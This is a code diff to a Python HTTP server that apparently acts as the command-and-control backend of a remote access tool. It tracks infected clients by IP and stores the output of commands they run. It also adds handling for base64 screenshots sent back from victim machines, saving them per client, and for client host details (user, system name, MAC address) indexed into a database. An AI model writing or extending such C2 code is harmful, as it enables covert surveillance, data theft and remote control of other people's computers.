@@ -1,6 +1,8 @@
+import os
 import json
 import time
 import queue
+import base64
 import threading
 import urllib.parse
 from pathlib import Path
@@ -16,6 +18,7 @@ from server_settings import (
 # Map client IP -> last command ID sent
 last_cmd_id_per_ip = {}
 last_cmd_lock = threading.Lock()
+CWD = None
 
 
 class MyHandler(BaseHTTPRequestHandler):
@@ -29,6 +32,14 @@ class MyHandler(BaseHTTPRequestHandler):
             return
         dir_path = Path(__file__).parent / str(client_id)
         dir_path.mkdir(parents=True, exist_ok=True)
+
+
+    def get_client_id_by_ip(self):
+        with client_lock:
+            for cid, info in CONNECTED_CLIENTS.items():
+                if info.get('ip') == self.client_address[0]:
+                    return cid
+        return None
 
 
     # Handles get request from client
@@ -86,6 +97,7 @@ class MyHandler(BaseHTTPRequestHandler):
 
     # Handles post requests from client
     def do_POST(self):
+        global CWD
         try:
             if self.path == RESPONSE or self.path == CWD_RESPONSE:
                 data = self._handle_post_data()
@@ -96,16 +108,40 @@ class MyHandler(BaseHTTPRequestHandler):
 
                 # Try to parse as key=value pairs (new client format)
                 parsed = urllib.parse.parse_qs(data)
+                current_directory = parsed.get('cwd', [None])[0]
+                if current_directory:
+                    CWD = current_directory
+
+                # Handle image if present
+                image_b64 = parsed.get('image', [None])[0]
+                if image_b64:
+                    # decode and save image
+                    try:
+                        image_b64 = parsed.get('image', [None])[0]
+                        if image_b64:
+                            image_data = base64.b64decode(image_b64)
+                            client_id = self.get_client_id_by_ip()
+
+                            if not os.path.exists(client_id):
+                                self.create_client_dir(client_id)
+
+                            filename = Path(client_id) / f"screenshot_{time.strftime('%Y-%m-%d_%H%M%S')}.png"
+                            with open(filename, 'wb') as f:
+                                f.write(image_data)
+                            print(f"[+] Saved screenshot: {filename}")
+
+                    except Exception as e:
+                        print(f"[-] Failed to decode/save image: {e}")
+
+
                 cmd_id = parsed.get('command_id', [None])[0]
                 cmd_output = parsed.get('output', [''])[0]
 
                 if cmd_id is not None:
-                    # New format: we have explicit command ID
                     if cmd_output.strip():
                         with response_lock:
                             response_storage[int(cmd_id)] = cmd_output
                 else:
-                    # Old format: data is the raw output, use last command ID for this IP
                     with last_cmd_lock:
                         last_id = last_cmd_id_per_ip.get(self.client_address[0])
                     if last_id is not None and data.strip():
@@ -118,27 +154,56 @@ class MyHandler(BaseHTTPRequestHandler):
                 self.send_response(200)
                 self.end_headers()
 
+
             elif self.path == CLIENT_CREDENTIALS:
-                data = self._handle_post_data()
-                client_info = json.loads(data)
+                content_length = int(self.headers.get('Content-Length', 0))
+                raw_data = self.rfile.read(content_length).decode()
+                parsed = urllib.parse.parse_qs(raw_data)
+                json_str = parsed.get(RESPONSE_KEY, [None])[0]
+
+                current_directory = parsed.get('cwd', [None])[0]
+                if current_directory:
+                    CWD = current_directory
+
+                if not json_str:
+                    self.send_response(400)
+                    self.end_headers()
+                    return
+
+                try:
+                    client_info = json.loads(json_str)
+                except json.JSONDecodeError as e:
+                    print(f"[-] Invalid JSON from client: {e}")
+                    self.send_response(400)
+                    self.end_headers()
+                    return
+
                 username = client_info.get("user")
+                system_name = client_info.get("system-name")
+                display = f"{username}@{system_name}"
+
                 if username and ES_HANDLER.is_client_present(username):
                     client_id = ES_HANDLER.get_client_id("mac-address", client_info.get("mac-address"))
                     if client_id:
                         ES_HANDLER.update_document(client_id, client_info)
                         print(f"[+] Updated client info for {username}")
+
+                        with client_lock:
+                            for cid, info in list(CONNECTED_CLIENTS.items()):
+                                if info.get('display') == display and cid != client_id:
+                                    CONNECTED_CLIENTS[client_id] = CONNECTED_CLIENTS.pop(cid)
+                                    break
                 else:
-                    new_client_id = ES_HANDLER.index_client_data(client_info)
-                    if new_client_id:
-                        self.create_client_dir(new_client_id)
-                    print(f"[+] Indexed new client info for {username}")
+                    new_id = ES_HANDLER.index_client_data(client_info)
+                    if new_id:
+                        print(f"[+] Indexed new client info for {username} with ID {new_id}")
+                        with client_lock:
+                            for cid, info in list(CONNECTED_CLIENTS.items()):
+                                if info.get('display') == display:
+                                    CONNECTED_CLIENTS[new_id] = CONNECTED_CLIENTS.pop(cid)
+                                    break
                 self.send_response(200)
                 self.end_headers()
-
-            else:
-                self.send_response(404)
-                self.end_headers()
-                print(f"[-] Unknown POST path: {self.path} from {self.client_address[0]}")
 
         except Exception as e:
             print(f"[-] Error in do_POST: {e}")
